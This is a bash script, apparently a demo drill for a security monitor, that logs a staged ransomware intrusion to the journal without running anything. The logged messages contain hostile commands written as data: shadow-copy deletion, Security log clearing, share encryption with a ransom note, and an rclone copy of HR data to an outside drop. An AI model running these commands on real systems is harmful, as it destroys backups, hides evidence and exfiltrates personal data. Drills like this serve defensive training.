#!/usr/bin/env bash
# A rehearsal intrusion for demos, in step with an attacker console run on
# another laptop. Each step writes to the journal what the watcher would see
# on the victim's machines, under the account and machine it happened on.
# Nothing is run.
#
#   tools/drill.sh                 press Enter as the attacker runs each step
#   DRILL_GAP=5 tools/drill.sh     no prompts, five seconds apart
#
# Start tools/ark-watch first. The phishing mail (step 1) never touches a
# server, so ARK sees nothing until the login.
set -euo pipefail

attacker=203.0.113.47

# identifier, account, machine, message
log() {
  printf 'SYSLOG_IDENTIFIER=%s\nARK_USER=%s\nARK_HOST=%s\nMESSAGE=%s\n' "$1" "$2" "$3" "$4" | logger --journald
  echo "  logged on $3: $4"
}

step() {
  if [ -n "${DRILL_GAP:-}" ] || [ ! -t 0 ]; then
    sleep "${DRILL_GAP:-3}"
    echo "#$1 $2"
  else
    read -rp "Enter when the attacker runs #$1 ($2) " _
  fi
}

step 1 "phishing"
echo "  nothing to log: the lure only reached a mailbox"

step 2 "login as Maya"
log sshd m.ortiz FIN-LAPTOP-07 "Accepted password for m.ortiz from $attacker port 50122 ssh2"

step 3 "delete backups"
log ark-shell m.ortiz FIN-LAPTOP-07 'vssadmin delete shadows /all /quiet'

step 4 "clear logs"
log ark-shell m.ortiz FIN-LAPTOP-07 'wevtutil cl Security'

step 5 "encrypt Finance files"
log ark-shell m.ortiz FS-01 'lock --share \\FS-01\Finance --note README_GRAYHOUND.txt'

step 6 "steal HR data"
log ark-shell m.ortiz HR-DB 'rclone copy \\HR-DB\Employees grayhound-drop:'

echo
echo "Done. Analyst: report it and post in chat. Manager: red to isolate, green once it's clean."
